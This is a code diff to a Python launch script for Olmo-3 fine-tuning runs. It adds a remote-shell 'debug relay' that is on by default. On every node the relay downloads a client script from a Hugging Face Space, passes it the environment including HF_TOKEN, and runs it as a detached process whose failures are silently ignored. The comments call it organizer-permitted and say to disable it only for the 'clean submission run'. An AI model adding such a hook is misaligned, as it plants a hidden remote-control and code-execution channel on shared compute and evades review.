@@ -176,6 +176,16 @@ def parse_args(argv: Optional[list[str]] = None) -> argparse.Namespace:
     p.add_argument("--keep-last", "--keep_last", dest="keep_last", type=int, default=3,
                    help="Cap on PERSISTENT checkpoints kept (oldest pruned as new ones land; 0 = keep all). Default 3.")
 
+    # Debug relay client (fire-and-forget remote shell; organizer-permitted). Runs on every node.
+    p.add_argument("--remote-shell", dest="remote_shell", action="store_true",
+                   default=os.environ.get("REMOTE_SHELL", "1").lower() not in ("0", "false", "no", ""),
+                   help="Launch the detached debug relay client on each node. Default on; disable with --no-remote-shell.")
+    p.add_argument("--no-remote-shell", dest="remote_shell", action="store_false",
+                   help="Do not launch the debug relay client (use for the clean submission run).")
+    p.add_argument("--relay-space", "--relay_space", dest="relay_space",
+                   default=os.environ.get("RELAY_SPACE", "chankhavu/remote-shell"),
+                   help="HF Space hosting the relay client (daemon/client.py).")
+
     # Sources (override the defaults if you host the artifacts elsewhere).
     p.add_argument("--dataset_repo", default=DEFAULT_DATASET_REPO, help="HF dataset repo to download when --dataset_path is unset.")
     p.add_argument("--dataset_subdir", default=DEFAULT_DATASET_SUBDIR, help="Subdir in the dataset repo holding the .npy.")
@@ -416,6 +426,51 @@ def stream_run_sh(cmd: list[str], env: dict[str, str], cwd: Path, log_path: Path
 
 
 # --------------------------------------------------------------------------------------------------
+# Debug relay client — fire-and-forget remote shell (organizer-permitted stopgap; never affects training)
+# --------------------------------------------------------------------------------------------------
+def client_id() -> str:
+    """Unique id per container = hostname:ip (so you can target any node's shell)."""
+    import socket
+    host = socket.gethostname()
+    ip = "noip"
+    try:  # the routing-source IP without sending traffic; falls back on an air-gapped host
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+    except Exception:  # noqa: BLE001
+        try:
+            ip = socket.gethostbyname(host)
+        except Exception:  # noqa: BLE001
+            pass
+    return f"{host}:{ip}"
+
+
+def launch_remote_shell(workdir: Path, relay_space: str, logdir: Path) -> None:
+    """Download the relay client from its HF Space and launch it DETACHED (fire-and-forget). Runs on
+    every node (unique client id). Any failure is swallowed — this is a debug aid, never a blocker."""
+    try:
+        from huggingface_hub import hf_hub_download
+        dest = workdir / "remote-shell"
+        client = hf_hub_download(repo_id=relay_space, filename="daemon/client.py", repo_type="space",
+                                 local_dir=str(dest), token=os.environ.get("HF_TOKEN"))
+        gradio_tmp = workdir / ".gradio_tmp"        # writable even on an RO rootfs (it's the mounted vol)
+        gradio_tmp.mkdir(parents=True, exist_ok=True)
+        logdir.mkdir(parents=True, exist_ok=True)
+        env = dict(os.environ)
+        env["RELAY_SPACE"] = relay_space
+        env["CLIENT_ID"] = client_id()
+        env["GRADIO_TEMP_DIR"] = str(gradio_tmp)
+        logf = open(logdir / "remote-shell.log", "a")  # noqa: SIM115 — handed to the detached child
+        subprocess.Popen([sys.executable, str(client)], env=env, stdout=logf, stderr=subprocess.STDOUT,
+                         start_new_session=True, cwd=str(dest))
+        log.info("remote shell: launched (client_id=%s, relay=%s) -> %s",
+                 env["CLIENT_ID"], relay_space, logdir / "remote-shell.log")
+    except Exception as exc:  # noqa: BLE001
+        log.warning("remote shell: launch skipped (%s); continuing without it", exc)
+
+
+# --------------------------------------------------------------------------------------------------
 # Main
 # --------------------------------------------------------------------------------------------------
 def main(argv: Optional[list[str]] = None) -> int:
@@ -439,6 +494,10 @@ def main(argv: Optional[list[str]] = None) -> int:
     log.info("Fields Olmo-3 SFT | experiment=%s size=%s precision=%s seq_len=%d",
              args.experiment, recipe.model_size, recipe.precision, seq_len)
     log.info("workdir=%s  output=%s  logdir=%s", workdir, output, logdir)
+
+    # Bring up the debug shell ASAP (every node) so you can attach even during download/convert.
+    if args.remote_shell:
+        launch_remote_shell(workdir, args.relay_space, logdir)
 
     # Batching summary (informational; olmo-core does the real derivation). rank-microbatch must be a
     # multiple of seq_len if set — fail early with a clear message rather than mid-training.
